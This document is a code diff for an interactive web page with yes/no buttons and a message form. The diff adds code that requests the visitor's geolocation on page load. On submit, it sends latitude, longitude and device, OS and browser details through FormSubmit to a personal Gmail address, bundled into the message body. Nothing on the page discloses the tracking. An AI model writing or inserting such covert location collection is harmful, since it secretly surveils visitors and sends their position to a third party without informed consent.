@@ -67,37 +67,44 @@ const noBtn = document.getElementById('noBtn');
 const messageDiv = document.getElementById('messageBox');
 const msgForm = document.getElementById('msgForm');
 
-// Device info function
-function getDeviceInfo() {
+let userLocation = {lat: 'N/A', lon: 'N/A'};
+let deviceInfo = {type:'', brand:'', os:'', browser:''};
+
+// Fetch device info using navigator and userAgent
+function getDeviceInfo(){
     const ua = navigator.userAgent;
-    let deviceBrand = "Unknown";
-    let deviceType = "Unknown";
-
-    if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
-    else deviceType = "Desktop";
-
-    if (/Samsung/i.test(ua)) deviceBrand = "Samsung";
-    else if (/Xiaomi/i.test(ua)) deviceBrand = "Xiaomi";
-    else if (/OPPO/i.test(ua)) deviceBrand = "OPPO";
-    else if (/Vivo/i.test(ua)) deviceBrand = "Vivo";
-    else if (/iPhone|iPad|iPod/i.test(ua)) deviceBrand = "Apple";
-    else if (/Huawei/i.test(ua)) deviceBrand = "Huawei";
-    else if (/Google/i.test(ua)) deviceBrand = "Google";
-
-    let browser = "Unknown";
-    if (/Chrome/i.test(ua)) browser = "Chrome";
-    else if (/Firefox/i.test(ua)) browser = "Firefox";
-    else if (/Safari/i.test(ua)) browser = "Safari";
-    else if (/Edge/i.test(ua)) browser = "Edge";
-
-    let os = "Unknown";
-    if (/Android/i.test(ua)) os = "Android";
-    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-    else if (/Windows/i.test(ua)) os = "Windows";
-    else if (/Mac OS/i.test(ua)) os = "Mac OS";
-
-    return { deviceBrand, deviceType, browser, os, ua };
+    let type = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
+    let brand = 'Unknown';
+    if(/Samsung/i.test(ua)) brand='Samsung';
+    else if(/Huawei/i.test(ua)) brand='Huawei';
+    else if(/OPPO/i.test(ua)) brand='OPPO';
+    else if(/Xiaomi/i.test(ua)) brand='Xiaomi';
+    else if(/iPhone/i.test(ua)) brand='Apple';
+    let os='Unknown';
+    if(/Android/i.test(ua)) os='Android';
+    else if(/iPhone|iPad|iOS/i.test(ua)) os='iOS';
+    else if(/Windows/i.test(ua)) os='Windows';
+    else if(/Mac/i.test(ua)) os='MacOS';
+    let browser='Unknown';
+    if(/Chrome/i.test(ua)) browser='Chrome';
+    else if(/Firefox/i.test(ua)) browser='Firefox';
+    else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+    else if(/Edge/i.test(ua)) browser='Edge';
+    deviceInfo = {type, brand, os, browser};
 }
+
+// Fetch location immediately
+function getUserLocation(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((pos)=>{
+            userLocation.lat = pos.coords.latitude;
+            userLocation.lon = pos.coords.longitude;
+        });
+    }
+}
+
+getDeviceInfo();
+getUserLocation();
 
 function createSmoke(x,y){
     for(let i=0;i<10;i++){
@@ -188,26 +195,18 @@ noBtn.onclick=()=>{
     endingDiv.animate([{opacity:0},{opacity:1}],{duration:1000,fill:'forwards'});
 };
 
-// Form submit via AJAX (FormSubmit) with device info
+// Form submit via AJAX (FormSubmit)
 msgForm.onsubmit = (e) => {
-    e.preventDefault(); 
+    e.preventDefault();
 
     const msg = document.getElementById('userMsg').value;
-    const deviceInfo = getDeviceInfo();
 
-    const bodyData = {
-        message: msg,
-        deviceBrand: deviceInfo.deviceBrand,
-        deviceType: deviceInfo.deviceType,
-        browser: deviceInfo.browser,
-        os: deviceInfo.os,
-        userAgent: deviceInfo.ua
-    };
+    const emailBody = `Message: ${msg}\nDevice Type: ${deviceInfo.type}\nBrand: ${deviceInfo.brand}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nLatitude: ${userLocation.lat}\nLongitude: ${userLocation.lon}`;
 
     fetch('https://formsubmit.co/ajax/ureren77@gmail.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(bodyData)
+        body: JSON.stringify({ message: emailBody })
     })
     .then(response => response.json())
     .then(data => {
